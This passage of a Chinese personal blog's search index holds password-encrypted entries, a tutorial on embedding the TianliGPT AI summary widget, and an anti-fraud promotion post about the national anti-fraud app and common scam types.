        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="295224c965034de27447f6088183dba920b1276e96257250e4eaeadfccada0cf">a43f6b9988103671f5bc4e06177506b708aa72886787cd9909cf247d3f545d839caedb20668e8167f44b3b2c7c07b40395f069a2efd4c3f0879ace37197571f889086874c5193ea707d5be146fd7d52c26213bc8f926729c19f948dd882c28b8a545172fcc32eb3c57574c4ef298618e7b0f4d542f2dc9ff6cfcfa6f29020947b2ae3f545426b9b87c343cff5aac302a9f1e20dcd7bdc348401655b32e5652cf8ab4d66619d243fd7aca10b0ba0d3cac73eabbd8f3473178d9376f84330600f6b2baef15c99020f6296d41a36674b1a40cc204ba593712c4446003f161df1567f3faa0ee89698a7526473489043fa1f8e22958e8f5d0ab8453d36e96aef2836eb5828bbf3db3a17da2419fd9c5e9817885b4292fe3e921de9e61a234c7b8cb937bacb9f4b1f072afcaaaa6f6572ac9d3e07907c947ba74b9c22aaef914d9703219408ca3a92cae06e218b10e8fb0be42d1b1723aa8496f2479f1088cef44462d25ff0540fa3521eb7b94e8706e0ef2d6cdfef4b96615c870f450881a5deb60539b68f153a547775b372db98f2b9939d34eb5e6a9800d0c317d5e23296b3f6f2e963fe0659e18899dd81ae647386ecc34c968d5de9f83770e96bcd8cd8c7f17395973f32df51d0991c912d2078cb74bdaaba7c79b71551499f3878b0f10ee31a124f556c47f04ad14af8d3b7472fd4cd43a425cc2560e50bae9660e76bc5d5977a5adedc00bcbf8f1eaa946d01080aba700920f1f25ed05b24aab7b5fcb487daf166117704c5493f5ad3caed2485440734f81cd51fe02f50c2d7d6a562dc005b64f8bb39aab05d8ee0b1ecf4ba4114d9ab6b685d8fa09c3aa4e0b841851d1ed56fe4ae76185b8d7152c004f37b49a3caec09980c6f0792a166a7f6827155cb834dfb9535bdca1ba26ca1003b9d527fb3b03f7015ee91077bd87e31ef0834da40e4c414a5ef78922b793bab42c0fb4bab3672589a7a7c842c467d0c090b2e50987f1598ebdf9e42a75d1ee61c79f30ae098467587de4f9e6ba57eb8f8bc360ae70e934b4702a258ea6a9f90b5d87934e697650f723eddf50035ef583d17d802caa5d4f77ddc7f27189dc23e47a8e50539ee0293cd781f9d21f9c2f90950eebdb05a567cc15d0e5098f29a37ebf28ecdccbb31c2bff906cdfdb4ffa183ba1b1a54253c321f928119d904ea256b04769641bc3a10d7d4bb24bb153e1a717304a84c17e7a4bf8bfad610ce33cb166fd6bdc9ca282012f66e8934583f3cbf1d3f6f81b89d498a1a137a5f2565ab5c90402cfa213f970f4d8a5ccf87c02dc6249d6b5adb459ee4731012e828c8a4b6ca4e8f415cbc52e0125014ddc3fdd4b27cc5f09e3da560bc1defb17e0761f35572927ae816fe3d490df5d9a01023beded3dc499b03c95435de8bedec90c1564225fb4bb66736c48cd157fffc35952a79eb846f15d9933385c8f22165c47e0bf7bf189402a2618e1ef6e0c9d8ff500a732abe5c3c0b6d827567112fe2c0e93abb2adfeb88d5e82db43721d1af328eec9e310157e2a7fbed134503589922b39d8aca44d25ba00048391774ec682ee013e6b47242cfabb30735b1fee3c07d6b0052a278d5c7230a866b3f79e5d5f656a769c18da6e176e82bb111fb16daafe86b42561fe82fd69c9c69d5cb82c0d87e1590716c7a992350967e070cdf7e7ffa594b82d045f1c69ba8189e44c57d9449eb69f771f719393621309a2b386f8f51fc7956c7454f6c7db3a75f2c6f1c782b9c263e29a18c0db51ee242c2c92da54c69b5b93b87bd6eed16a5770936571808506c93437bef05e47defa7835be4491c9ae977d961d7f79e34a77e333d4368916f96802db3573b0bd3c5e3d0ecf720af67913a587c11c70a0e545c1a72d5ac0edafaef2cc032d4d152bc2499f287ae19459977e36a90b1ccb05a08c094423706ea694ccdaa094fdc7fc6a1f7d3bc4876190b78344b2c24b2423b12f44783ccfb3023733b7c84a697711806bafb9b50184f1070e0be91306ff0212066e0e415ed9079333e3d792067ad5022d612eacb9930cab3c00848d8cda1547da67cde2f6d4c6a7492c7da53a255a63f2674bc5151afb11248d5e2aa29f9a544e855bb8c9c144e466c4dbac04c6eb9bee29054ed5d186cd2a9068391b79b3ca53bcc9aa2526dcaa4e3efd2ccb2e18799c0f361a7a3928380656beb81ad94649164261a4246c434159fe07e9d390cd4f0adb3bf479d13ef7ac76a6cededca90ee5445c6fe361b8eceecc043cd64cae9d0ea9246b3822983d79e00e980d5798d6265ccc3c1aaa68f56d78fa3010636f6445b15101df8e51bd06cf23ec456559a9c3293fbf832c572a41d6f01f4018c60ca3ffefc77b28602aa027c3524e7735908dd6a5a1adc52c94df21795ef82c764e63ed183908283f9e90df6e0169d885e5f9e970da7155e4f0bafee976693b4ecbe485656fe19e2392c9e615945d7eaa8605fc196d100dfdfe7d25988d6a3e43221d6362182aae2b31545790f729fe81a9e9edef8ab096800f4264b5b2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工作记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络中心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>党纪学习教育心得体会</title>
      <link href="/posts/b01882d5.html"/>
      <url>/posts/b01882d5.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看加密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="ed2d4b6d716ff35841ea00ec6ac12a47c19f6b2603ff906db4821cd23a18858b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 党务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 纪律处分条例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI文章摘要</title>
      <link href="/posts/da81a947.html"/>
      <url>/posts/da81a947.html</url>
      
        <content type="html"><![CDATA[<h1 id="通用教程-TianliGPT"><a href="#通用教程-TianliGPT" class="headerlink" title="通用教程 | TianliGPT"></a>通用教程 | TianliGPT</h1><blockquote><h2 id="Excerpt"><a href="#Excerpt" class="headerlink" title="Excerpt"></a>Excerpt</h2><p>文章摘要生成工具</p></blockquote><hr><h2 id="通用教程"><a href="#通用教程" class="headerlink" title="通用教程 "></a>通用教程 <a href="https://postsummary.zhheo.com/theme/custom.html#%E9%80%9A%E7%94%A8%E6%95%99%E7%A8%8B"></a></h2><p>这个教程是教你如何让自己的网页适配TianliGPT。</p><h2 id="将代码插入到网页"><a href="#将代码插入到网页" class="headerlink" title="将代码插入到网页 "></a>将代码插入到网页 <a href="https://postsummary.zhheo.com/theme/custom.html#%E5%B0%86%E4%BB%A3%E7%A0%81%E6%8F%92%E5%85%A5%E5%88%B0%E7%BD%91%E9%A1%B5"></a></h2><p>我们需要将下面的代码插入到网页的任何位置。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://ai.tianli0.top/static/public/tianli_gpt.min.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> tianliGPT_postSelector = <span class="string">&#x27;#post #article-container&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> tianliGPT_key = <span class="string">&#x27;5Q5mpqRK5DkwT1X9Gi5e&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ai.tianli0.top/static/public/tianli_gpt.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以观察一下代码，里面有<strong>tianliGPT_postSelector</strong>和<strong>tianliGPT_key</strong>这两个变量，我们需要更改里面的值来适配不同的主题，并且配置更多内容。</p><h2 id="获取tianliGPT-postSelector"><a href="#获取tianliGPT-postSelector" class="headerlink" title="获取tianliGPT_postSelector "></a>获取tianliGPT_postSelector <a href="https://postsummary.zhheo.com/theme/custom.html#%E8%8E%B7%E5%8F%96tianligpt-postselector"></a></h2><p>打开你的文章界面，按下<code>F12</code>键，打开开发者工具。</p><p><img src= "" data-lazy-src="https://p.zhheo.com/EEdhvU22290881693362742498.png!blogimg"></p><p>点击选择器按钮。</p><p><img src= "" data-lazy-src="https://p.zhheo.com/QzCimX25390881693362773087.png!blogimg"></p><p>然后鼠标选中到博客的文章。通过滑动鼠标尽可能的让方块涵盖文章中的所有内容。例如：</p><p><img src= "" data-lazy-src="https://p.zhheo.com/UEujWb20790881693362787946.png!blogimg"></p><p>我的鼠标大致在红色的位置。</p><p>然后点击一下。我们可以看到这一行变灰了，说明被选中了。</p><p><img src= "" data-lazy-src="https://p.zhheo.com/I1GSxv22890881693362808100.png!blogimg"></p><p>然后我们鼠标放在灰色部分，来检查选中的部分是否包含整个文章，但是不包含文章外的东西。</p><p>很显然，鼠标放在post行时，出现了下方的按钮被选中的情况。</p><p><img src= "" data-lazy-src="https://p.zhheo.com/jdpnEp24090881693362820382.png!blogimg"></p><p>我们观察一些页面结构，发现post里面有多个结构，我们选择符合我们的要求的div元素。</p><p><img src= "" data-lazy-src="https://p.zhheo.com/jCy8He21090881693362850466.png!blogimg"></p><p>我们发现这一行正好符合我们的要求。</p><ul><li><p>包含了整个文章</p></li><li><p>不包含文章外的内容</p></li></ul><p>我们右键单击，然后复制这一行的选择器：</p><p><img src= "" data-lazy-src="https://p.zhheo.com/CjZKlk22290881693362862149.png!blogimg"></p><p>复制的内容就是我们的 tianliGPT_postSelector。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题 "></a>常见问题 <a href="https://postsummary.zhheo.com/theme/custom.html#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"></a></h2><h3 id="在不应该出现摘要的界面出现了摘要"><a href="#在不应该出现摘要的界面出现了摘要" class="headerlink" title="在不应该出现摘要的界面出现了摘要 "></a>在不应该出现摘要的界面出现了摘要 <a href="https://postsummary.zhheo.com/theme/custom.html#%E5%9C%A8%E4%B8%8D%E5%BA%94%E8%AF%A5%E5%87%BA%E7%8E%B0%E6%91%98%E8%A6%81%E7%9A%84%E7%95%8C%E9%9D%A2%E5%87%BA%E7%8E%B0%E4%BA%86%E6%91%98%E8%A6%81"></a></h3><p>你可以再添加一个变量来实现只匹配文章url。这个是通过<code>tianliGPT_postURL</code>来实现。</p><p>你可以添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tianliGPT_postURL = <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><p>其中双引号的内容为匹配的文章地址，支持通配符。例如在hexo博客中，文章的地址通常为：</p><p><a href="https://w0xking.github.io/post/494f7a99.html">https://w0xking.github.io/post/494f7a99.html</a></p><p><a href="https://w0xking.github.io/post/da81a947.html">https://w0xking.github.io/post/da81a947.html</a></p><p>所以我们可以填写通用格式：<code>*/post/*.html</code></p><h3 id="如果你用的是Butterfly主题可以在主题文件夹下的themes-butterfly-config-yml文件中的inject属性中配置："><a href="#如果你用的是Butterfly主题可以在主题文件夹下的themes-butterfly-config-yml文件中的inject属性中配置：" class="headerlink" title="如果你用的是Butterfly主题可以在主题文件夹下的themes&#x2F;butterfly&#x2F;_config.yml文件中的inject属性中配置："></a>如果你用的是<font color="#ff5f6d">Butterfly</font>主题可以在主题文件夹下的themes&#x2F;butterfly&#x2F;_config.yml文件中的inject属性中配置：</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;https://ai.tianli0.top/static/public/tianli_gpt.min.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">let</span> <span class="string">tianliGPT_postSelector</span> <span class="string">=</span> <span class="string">&#x27;\#post \#article-container&#x27;</span><span class="string">;let</span> <span class="string">tianliGPT_theme</span> <span class="string">=</span> <span class="string">&#x27;yanzhi&#x27;</span> <span class="string">;let</span> <span class="string">tianliGPT_blacklist</span> <span class="string">=</span> <span class="string">&#x27;https://w0xking.github.io/blacklist.json&#x27;</span><span class="string">;</span> <span class="string">let</span> <span class="string">tianliGPT_Title</span> <span class="string">=</span> <span class="string">&#x27;来自kking的AI摘要&#x27;</span><span class="string">;let</span> <span class="string">tianliGPT_wordLimit</span> <span class="string">=</span> <span class="number">120</span><span class="string">;let</span> <span class="string">tianliGPT_key</span> <span class="string">=&#x27;5Q5mpqRK5DXXXXXXX&#x27;;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">src=&quot;https://ai.tianli0.top/static/public/tianli_gpt.min.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><code>注意</code>：<font color="#ff5f6d">tianliGPT_key</font>需要放在所有let属性的最后。</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> 交互 </tag>
            
            <tag> 摘要 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反诈骗宣传</title>
      <link href="/posts/494f7a99.html"/>
      <url>/posts/494f7a99.html</url>
      
        <content type="html"><![CDATA[<h1 id="“国家反诈中心”APP介绍"><a href="#“国家反诈中心”APP介绍" class="headerlink" title="“国家反诈中心”APP介绍"></a>“国家反诈中心”APP介绍</h1><blockquote><p>开启国家反诈中心app中的诈骗预警功能，可以有效的防止你的来电、短信以及手机APP出现欺诈性的内容，保障用户的手机安全。</p></blockquote><p>国家反诈中心是国务院打击治理电信网络新型违法犯罪工作部际联席会议合成作战平台，集资源整合、情报研判、侦查指挥为一体，在打击、防范、治理电信网络诈骗等新型违法犯罪中发挥着重要作用。</p><p>2021年2月1日，国家反诈中心正式入驻人民日报客户端、微信视频号、新浪微博、抖音、快手等五家新媒体平台，开通官方政务号</p><p>2021年6月17日，公安部召开新闻发布会，通报全国公安机关打击治理电信网络诈骗犯罪举措成效，公安部刑事侦查局副局长姜国利介绍，公安部推出了国家反诈中心APP和宣传手册，努力为人民群众构筑一道防诈反诈的“防火墙”，目前，国家反诈中心APP的全国注册用户已超过6500万，已向用户发送预警2300万次，接受群众举报涉诈线索65万条，在防范诈骗工作中发挥了重要作用  </p><h2 id="成立背景"><a href="#成立背景" class="headerlink" title="成立背景"></a>成立背景</h2><p>2020年，以电信网络诈骗为代表的新型网络违法犯罪形势严峻复杂，发案数仍在高位运行，骗术手法翻新极快、隐蔽性更强，严重侵犯人民群众财产权利和人身权利，已成为影响人民群众获得感、幸福感、安全感的突出问题。全国公安机关打击治理实践证明，电信网络诈骗犯罪是可防性犯罪，宣传防范是压降发案的重要手段</p><p>2020年贷款诈骗、刷单诈骗、冒充客服诈骗、杀猪盘诈骗等四类案件多发高发，严重危害人民群众的财产安全和合法权益。为此，国家反诈中心组建工作专班，开展集群战役，实施集中打击整治</p><h2 id="主要职责"><a href="#主要职责" class="headerlink" title="主要职责"></a>主要职责</h2><p>作为国家反诈中心的权威发布平台，官方政务号是公安部认真践行网上群众路线，进一步密切联系群众、发好公安声音、推动公安机关媒体深度融合发展的重要举措。</p><p>国家反诈中心官方政务号将采取民警宣讲、警民互动、网络情景剧、公益宣传片、抓捕实录等多种形式，常态化更新宣传内容，及时发布防骗预警，将陆续发布系列情景短片，揭批近来高发的网络贷款、网络刷单、“杀猪盘”、冒充客服退款、假冒熟人、冒充“公检法”、“荐股”、虚假购物、注销“校园贷”、买卖游戏币等十大诈骗类型。</p><h2 id="反诈防骗平台"><a href="#反诈防骗平台" class="headerlink" title="反诈防骗平台"></a>反诈防骗平台</h2><ul><li>支付宝“安全学院”<br>2021年2月1日，在国家反诈中心指导下，支付宝安全中心设立的公益反诈防骗平台“安全学院”也正式登陆支付宝。国家反诈中心官方新媒体账号也同步上线，来自全国公安机关的防骗专家将通过新媒体形式，为7亿支付宝用户提供反欺诈知识，帮助用户树立全面的防骗意识。</li></ul><h2 id="中心提醒"><a href="#中心提醒" class="headerlink" title="中心提醒"></a>中心提醒</h2><p>**国家反诈中心提醒：</p><ul><li>牢记“三不一多”原则，守住钱袋子。**</li><li>针对贷款类诈骗、兼职刷单类诈骗、冒充客服退款类诈骗案件高发多发，国家反诈中心民警总结出了防 范小贴士，并提醒大家在日常生活中就要牢记“三不一多”原则。</li><li><strong>即：未知链接不点击，陌生来电不轻信，个人信息不透露，转账汇款多核实。</strong><br>国家反诈中心提醒：有不法分子利用腾讯会议实施冒充公检法的诈骗</li><li>2021年1月26日，公安部官网提示，国家反诈中心发现，有不法分子利用腾讯会议视频会议、共享屏幕等功能实施冒充公检法诈骗。并通过一位受害事主的受骗过程进行分析。</li><li><strong>国家反诈中心提醒：谨防备用金退款诈骗</strong></li><li>针对冒充客服备用金退款诈骗案件多发，国家反诈中心特别提示用户避免受骗上当。<br>该类案件中，诈骗者盗取消费者个人信息，冒充客服声称商品质量有问题，已将退款汇入用户的“备用金”账户。</li><li>在骗取消费者信任后，诈骗者会以“退款打多了，不退款会有高额利息”等理由要求消费者“退还”款项，并进一步提出帮消费者“注销错误账户”等，诱导受害者通过网络借贷等方式转账给诈骗者。</li><li>国家反诈中心提示：“备用金仅用于个人消费，任何声称退款、汇款进备用金账户的都是骗子。年关将至，网络诈骗高发，建议大家提高警惕，不要轻信骗子以办理退款、注销账户等名义要求转账的骗术。”</li></ul><p><strong>软件介绍</strong></p><ul><li>国家反诈中心app是一款能有效预防诈骗、快速举报诈骗内容的软件，软件里面有丰富的防诈骗知识，通过学习里面的知识可以有效避免各种网络诈骗的发生，提高每个用户的防骗能力，还可以随时向平台举报各种诈骗信息，减少不必要的财产损失。 [7]</li><li>2021年6月，公安部推出国家反诈中心App，它的“<strong>反诈预警</strong>、<strong>身份验真</strong>、<strong>App自查</strong>、<strong>风险查询</strong>”等核心功能可以最大限度减少民众被骗的可能性。然而，这也让它成为骗子的“眼中钉”。</li><li>近期，有民警发现一些诈骗分子费尽心机，开发出迷惑性极强的“公安防护”App对此，警方提示只有国家反诈中心App才是真正的反诈软件其他的山寨软件一定要小心。</li></ul><p><strong>“国家反诈中心APP”的强大功能</strong><br>1、可以免费为您提供防骗保护，当收到涉嫌诈骗的电话、短信、网址或者安装涉嫌诈骗的APP时，可以智能识别骗子身份并及时预警，极大的降低受骗可能性。<br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/9.jpg"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/9.jpg"></a><br>2、对非法可疑的电信网络诈骗行为进行在线举报，为公安提供更多的反诈线索。在使用手机过程中，如果发现可疑的手机号、短信，赌博、钓鱼网站，诈骗APP等信息，可以在“我要举报”模块进行举报，后台会及时封杀他们。<br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/10.jpg"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/10.jpg"></a></p><p>3、定期推送防诈文章，曝光最新诈骗案例，提高防骗意识。同时会根据不同年龄、职业等人群特点，测试被骗风险指数，防患于未然。<br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/11.jpg"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/11.jpg"></a></p><p>4、进行风险查询，在涉及陌生账号转账时，可以验证对方的账号是否涉诈，包括支付账户、IP网址、QQ、微信等，及时避开资金被骗风险。<br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/12.jpg"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/12.jpg"></a></p><p>5、进行真实身份验证，在社交软件上交友、转账时，验证对方身份的真实性，防止对方冒充身份进行诈骗。<br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/13.jpg"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/13.jpg"></a></p><h2 id="下载注册方法"><a href="#下载注册方法" class="headerlink" title="下载注册方法"></a>下载注册方法</h2><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><blockquote><p>国家反诈中心APP旨在帮助用户维护电信网络安全，为用户建立电信网络涉案举报渠道，增强防范宣传，致力于构建良好的电信网络环境。<br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/28.webp"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/28.webp"></a><br><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/29.webp"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/29.webp"></a></p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><a href="https://www.hack-gov.com.cn/posts/21480.html#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9" title="注意事项"></a>注意事项</h2><p><a href="https://www.hack-gov.com.cn/news-photo%5C20210906/30.webp"><img src= "" data-lazy-src="https://www.hack-gov.com.cn/news-photo%5C20210906/30.webp"></a></p><h2 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a><a href="https://www.hack-gov.com.cn/posts/21480.html#%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94" title="问题解答"></a>问题解答</h2><p><strong>国家反诈中心举报有用吗？</strong></p><ul><li>国家反诈中心举报是有用的，但凡是网络诈骗找反诈中心均是有用的。</li><li>国家反诈中心APP由公安部刑事侦查局组织开发，是一款能有效预防诈骗、快速举报诈骗内容的软件，软件内有丰富的防诈骗知识，通过学习里面的知识可以有效避免各种网络诈骗的发生，还可以随时向平台举报各种诈骗信息，减少不必要的财产损失。</li></ul><p><strong>国家反诈中心举报后会怎样？</strong></p><ul><li>用户举报以后国家反诈中心可以接收到举报信息，所有的电信诈骗案都上传到国家中心，然后国家反诈中心把一个骗局的受害者串案，成立专案组。</li><li>专案组中一个案子的受害者都在一起，线索肯定很多，相对以往来说会方便很多的。</li></ul><p><strong>国家举报中心举报多久受理？</strong></p><ul><li>流程与12345市长热线差不多。</li><li>市政府办公室下面会有专门科室负责这项工作，一般是大数据中心（电子政务中心）。</li><li>中心接到举报后，会将其转给相应的部门进行处理；部门处理后，将情况反馈至中心；中心再将情况反馈给举报者。</li></ul><p><em>说了这么多，<br>你还没有下载<br>“国家反诈中心APP”吗？</em></p><p><strong>因本站基于网络安全法范围内不提供非法使用服务，可在各大手机品牌应用商店搜索：“国家反诈中心”App下载，请勿下载不含有上述名字的App软件谨防假冒。</strong>  </p><h1 id="常见诈骗手段-“反诈秘籍”"><a href="#常见诈骗手段-“反诈秘籍”" class="headerlink" title="常见诈骗手段 “反诈秘籍”"></a>常见诈骗手段 “反诈秘籍”</h1><p>整理了电信网络诈骗9大类型58种诈骗手法希望能帮助大家远离诈骗</p><h2 id="仿冒身份类"><a href="#仿冒身份类" class="headerlink" title="仿冒身份类"></a>仿冒身份类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/2.231oiwtgi6.jpg" alt="Alt pic"></p><h2 id="购物类"><a href="#购物类" class="headerlink" title="购物类"></a>购物类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/3.92py0t5tcg.jpg" alt="Alt pic"></p><h2 id="活动购物类"><a href="#活动购物类" class="headerlink" title="活动购物类"></a>活动购物类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/4.5c0sfkgy4x.jpg" alt="Alt pic"></p><h2 id="利益诱惑类"><a href="#利益诱惑类" class="headerlink" title="利益诱惑类"></a>利益诱惑类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/5.9dcrtyl1hu.jpg" alt="Alt pic"></p><h2 id="虚构险情类"><a href="#虚构险情类" class="headerlink" title="虚构险情类"></a>虚构险情类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/6.64dnxaxjv7.jpg" alt="Alt pic"></p><h2 id="日常生活消费类"><a href="#日常生活消费类" class="headerlink" title="日常生活消费类"></a>日常生活消费类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/7.syrclbh79.jpg" alt="Alt pic"></p><h2 id="钓鱼-木马病毒类"><a href="#钓鱼-木马病毒类" class="headerlink" title="钓鱼&#x2F;木马病毒类"></a>钓鱼&#x2F;木马病毒类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/8.67x9v0qml1.jpg" alt="Alt pic"></p><h2 id="提供特定服务类"><a href="#提供特定服务类" class="headerlink" title="提供特定服务类"></a>提供特定服务类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/9.2a4wecflxy.jpg" alt="Alt pic"></p><h2 id="其他新型违法类"><a href="#其他新型违法类" class="headerlink" title="其他新型违法类"></a>其他新型违法类</h2><p><img src= "" data-lazy-src="https://w0xking.github.io/picx-images-hosting/fanzha/10.5c0sfkgy54.jpg" alt="Alt pic"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐 </tag>
            
            <tag> 网络诈骗 </tag>
            
            <tag> 电信诈骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>道德经</title>
      <link href="/posts/8e6daf7b.html"/>
      <url>/posts/8e6daf7b.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7ea1d0d8413f22597eaeb2981b0b431cf9e601d3b7389f38cfa5c60dc25e9d1d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 古文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐 </tag>
            
            <tag> 道学 </tag>
            
            <tag> 经典 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计笔记（Python）</title>
      <link href="/posts/e7654e82.html"/>
      <url>/posts/e7654e82.html</url>
      
